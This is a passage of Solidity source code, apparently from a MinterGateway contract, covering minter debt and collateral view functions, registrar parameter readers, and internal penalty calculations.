This should also include the principal value of unavoidable penalities. But then it would be very, if\n        //       not impossible, to determine the `principalOfTotalActiveOwedM` to the same standards.\n        return\n            _minterStates[minter_].isActive\n                ? uint112(_rawOwedM[minter_]) // Treat rawOwedM as principal since minter is active.\n                : 0;\n    }\n\n    /// @inheritdoc IMinterGateway\n    function activeOwedMOf(address minter_) public view returns (uint240) {\n        // NOTE: This should also include the present value of unavoidable penalities. But then it would be very, if\n        //       not impossible, to determine the `totalActiveOwedM` to the same standards.\n        return\n            _minterStates[minter_].isActive\n                ? _getPresentAmount(uint112(_rawOwedM[minter_])) // Treat rawOwedM as principal since minter is active.\n                : 0;\n    }\n\n    /// @inheritdoc IMinterGateway\n    function maxAllowedActiveOwedMOf(address minter_) public view returns (uint256) {\n        // NOTE: Since `mintRatio()` is capped at 650% (i.e. 65_000) this cannot overflow.\n        unchecked {\n            return _minterStates[minter_].isActive ? (uint256(collateralOf(minter_)) * mintRatio()) / ONE : 0;\n        }\n    }\n\n    /// @inheritdoc IMinterGateway\n    function inactiveOwedMOf(address minter_) public view returns (uint240) {\n        // Treat rawOwedM as present amount since minter is inactive.\n        return _minterStates[minter_].isActive ? 0 : _rawOwedM[minter_];\n    }\n\n    /// @inheritdoc IMinterGateway\n    function collateralOf(address minter_) public view returns (uint240) {\n        // If collateral was not updated by the deadline, assume that minter's collateral is zero.\n        if (block.timestamp >= collateralExpiryTimestampOf(minter_)) return 0;\n\n        MinterState storage minterState_ = _minterStates[minter_];\n        uint240 totalPendingRetrievals_ = minterState_.totalPendingRetrievals;\n        uint240 collateral_ = minterState_.collateral;\n\n        // If the minter's total pending retrievals is greater than their collateral, then their collateral is zero.\n        if (totalPendingRetrievals_ >= collateral_) return 0;\n\n        unchecked {\n            return collateral_ - totalPendingRetrievals_;\n        }\n    }\n\n    /// @inheritdoc IMinterGateway\n    function collateralUpdateTimestampOf(address minter_) external view returns (uint40) {\n        return _minterStates[minter_].updateTimestamp;\n    }\n\n    /// @inheritdoc IMinterGateway\n    function collateralPenaltyDeadlineOf(address minter_) external view returns (uint40) {\n        MinterState storage minterState_ = _minterStates[minter_];\n        uint32 updateCollateralInterval_ = updateCollateralInterval();\n\n        (, uint40 missedUntil_) = _getMissedCollateralUpdateParameters(\n            minterState_.updateTimestamp,\n            minterState_.penalizedUntilTimestamp,\n            updateCollateralInterval_\n        );\n\n        return missedUntil_ + updateCollateralInterval_;\n    }\n\n    /// @inheritdoc IMinterGateway\n    function collateralExpiryTimestampOf(address minter_) public view returns (uint40) {\n        unchecked {\n            return _minterStates[minter_].updateTimestamp + updateCollateralInterval();\n        }\n    }\n\n    /// @inheritdoc IMinterGateway\n    function penalizedUntilOf(address minter_) external view returns (uint40) {\n        return _minterStates[minter_].penalizedUntilTimestamp;\n    }\n\n    /// @inheritdoc IMinterGateway\n    function latestProposedRetrievalTimestampOf(address minter_) external view returns (uint40) {\n        return _minterStates[minter_].latestProposedRetrievalTimestamp;\n    }\n\n    /// @inheritdoc IMinterGateway\n    function getLastSignatureTimestamp(address minter_, address validator_) external view returns (uint256) {\n        return _lastSignatureTimestamp[minter_][validator_];\n    }\n\n    /// @inheritdoc IMinterGateway\n    function getUpdateCollateralDigest(\n        address minter_,\n        uint256 collateral_,\n        uint256[] calldata retrievalIds_,\n        bytes32 metadataHash_,\n        uint256 timestamp_\n    ) external view returns (bytes32) {\n        return _getUpdateCollateralDigest(minter_, collateral_, retrievalIds_, metadataHash_, timestamp_);\n    }\n\n    /// @inheritdoc IMinterGateway\n    function mintProposalOf(\n        address minter_\n    ) external view returns (uint48 mintId_, uint40 createdAt_, address destination_, uint240 amount_) {\n        mintId_ = _mintProposals[minter_].id;\n        createdAt_ = _mintProposals[minter_].createdAt;\n        destination_ = _mintProposals[minter_].destination;\n        amount_ = _mintProposals[minter_].amount;\n    }\n\n    /// @inheritdoc IMinterGateway\n    function pendingCollateralRetrievalOf(address minter_, uint256 retrievalId_) external view returns (uint240) {\n        return\n            _minterStates[minter_].isDeactivated\n                ? 0\n                : _pendingCollateralRetrievals[minter_][UIntMath.safe48(retrievalId_)];\n    }\n\n    /// @inheritdoc IMinterGateway\n    function totalPendingCollateralRetrievalOf(address minter_) external view returns (uint240) {\n        return _minterStates[minter_].isDeactivated ? 0 : _minterStates[minter_].totalPendingRetrievals;\n    }\n\n    /// @inheritdoc IMinterGateway\n    function frozenUntilOf(address minter_) external view returns (uint40) {\n        return _minterStates[minter_].frozenUntilTimestamp;\n    }\n\n    /* ============ TTG Registrar Reader Functions ============ */\n\n    /// @inheritdoc IMinterGateway\n    function isMinterApproved(address minter_) public view returns (bool) {\n        return TTGRegistrarReader.isApprovedMinter(ttgRegistrar, minter_);\n    }\n\n    /// @inheritdoc IMinterGateway\n    function isValidatorApproved(address validator_) public view returns (bool) {\n        return TTGRegistrarReader.isApprovedValidator(ttgRegistrar, validator_);\n    }\n\n    /// @inheritdoc IMinterGateway\n    function updateCollateralInterval() public view returns (uint32) {\n        return\n            UIntMath.max32(\n                UIntMath.bound32(TTGRegistrarReader.getUpdateCollateralInterval(ttgRegistrar)),\n                MIN_UPDATE_COLLATERAL_INTERVAL\n            );\n    }\n\n    /// @inheritdoc IMinterGateway\n    function updateCollateralValidatorThreshold() public view returns (uint256) {\n        return TTGRegistrarReader.getUpdateCollateralValidatorThreshold(ttgRegistrar);\n    }\n\n    /// @inheritdoc IMinterGateway\n    function mintRatio() public view returns (uint32) {\n        // NOTE: It is possible for the mint ratio to be greater than 100%, but capped at 650%.\n        return UIntMath.min32(MAX_MINT_RATIO, UIntMath.bound32(TTGRegistrarReader.getMintRatio(ttgRegistrar)));\n    }\n\n    /// @inheritdoc IMinterGateway\n    function mintDelay() public view returns (uint32) {\n        return UIntMath.bound32(TTGRegistrarReader.getMintDelay(ttgRegistrar));\n    }\n\n    /// @inheritdoc IMinterGateway\n    function mintTTL() public view returns (uint32) {\n        return UIntMath.bound32(TTGRegistrarReader.getMintTTL(ttgRegistrar));\n    }\n\n    /// @inheritdoc IMinterGateway\n    function minterFreezeTime() public view returns (uint32) {\n        return UIntMath.bound32(TTGRegistrarReader.getMinterFreezeTime(ttgRegistrar));\n    }\n\n    /// @inheritdoc IMinterGateway\n    function penaltyRate() public view returns (uint32) {\n        return UIntMath.bound32(TTGRegistrarReader.getPenaltyRate(ttgRegistrar));\n    }\n\n    /// @inheritdoc IMinterGateway\n    function rateModel() public view returns (address) {\n        return TTGRegistrarReader.getMinterRateModel(ttgRegistrar);\n    }\n\n    /// @inheritdoc IContinuousIndexing\n    function currentIndex() public view override(ContinuousIndexing, IContinuousIndexing) returns (uint128) {\n        // NOTE: Safe to use unchecked here, since `block.timestamp` is always greater than `latestUpdateTimestamp`.\n        unchecked {\n            return\n                // NOTE: Cap the index to `type(uint128).max` to prevent overflow in present value math.\n                UIntMath.bound128(\n                    ContinuousIndexingMath.multiplyIndicesUp(\n                        latestIndex,\n                        ContinuousIndexingMath.getContinuousIndex(\n                            ContinuousIndexingMath.convertFromBasisPoints(_latestRate),\n                            uint32(block.timestamp - latestUpdateTimestamp)\n                        )\n                    )\n                );\n        }\n    }\n\n    /* ============ Internal Interactive Functions ============ */\n\n    /**\n     * @dev    Imposes penalty on an active minter. Calling this for an inactive minter will break accounting.\n     * @param  minter_                 The address of the minter.\n     * @param  principalOfPenaltyBase_ The principal of the base for penalization.\n     * @return The principal of the imposed penalty.\n     */\n    function _imposePenalty(address minter_, uint152 principalOfPenaltyBase_) internal returns (uint112) {\n        if (principalOfPenaltyBase_ == 0) return 0;\n\n        uint32 penaltyRate_ = penaltyRate();\n\n        if (penaltyRate_ == 0) return 0;\n\n        unchecked {\n            uint256 penaltyPrincipal_ = (uint256(principalOfPenaltyBase_) * penaltyRate_) / ONE;\n\n            // As an edge case precaution, cap the penalty principal such that the resulting principal of total active\n            // owed M plus the penalty principal is not greater than the max uint112.\n            uint256 newPrincipalOfTotalActiveOwedM_ = principalOfTotalActiveOwedM + penaltyPrincipal_;\n\n            if (newPrincipalOfTotalActiveOwedM_ > type(uint112).max) {\n                penaltyPrincipal_ = type(uint112).max - principalOfTotalActiveOwedM;\n                newPrincipalOfTotalActiveOwedM_ = type(uint112).max;\n            }\n\n            // Calculate and add penalty principal to total minter's principal of active owed M\n            principalOfTotalActiveOwedM = uint112(newPrincipalOfTotalActiveOwedM_);\n\n            _rawOwedM[minter_] += uint112(penaltyPrincipal_); // Treat rawOwedM as principal since minter is active.\n\n            return uint112(penaltyPrincipal_);\n        }\n    }\n\n    /**\n     * @dev   Imposes penalty if minter missed collateral updates.\n     * @param minter_ The address of the minter.\n     */\n    function _imposePenaltyIfMissedCollateralUpdates(address minter_) internal {\n        uint112 principalOfActiveOwedM_ = principalOfActiveOwedMOf(minter_);\n\n        if (principalOfActiveOwedM_ == 0) return;\n\n        MinterState storage minterState_ = _minterStates[minter_];\n\n        (uint40 missedIntervals_, uint40 missedUntil_) = _getMissedCollateralUpdateParameters(\n            minterState_.updateTimestamp,\n            minterState_.penalizedUntilTimestamp,\n            updateCollateralInterval()\n        );\n\n        if (missedIntervals_ == 0) return;\n\n        // Save until when the minter has been penalized for missed intervals to prevent double penalizing them.\n        minterState_.penalizedUntilTimestamp = missedUntil_;\n\n        uint112 penaltyPrincipal_ = _imposePenalty(minter_, uint152(principalOfActiveOwedM_) * missedIntervals_);\n\n        if (penaltyPrincipal_ == 0) return;\n\n        emit MissedIntervalsPenaltyImposed(minter_, missedIntervals_, _getPresentAmount(penaltyPrincipal_));\n    }\n\n    /**\n     * @dev   Imposes penalty if minter is undercollateralized.\n     * @param minter_       The address of the minter.\n     * @param newTimestamp_ The timestamp of the collateral update.\n     */\n    function _imposePenaltyIfUndercollateralized(addre"
    }
  ]
}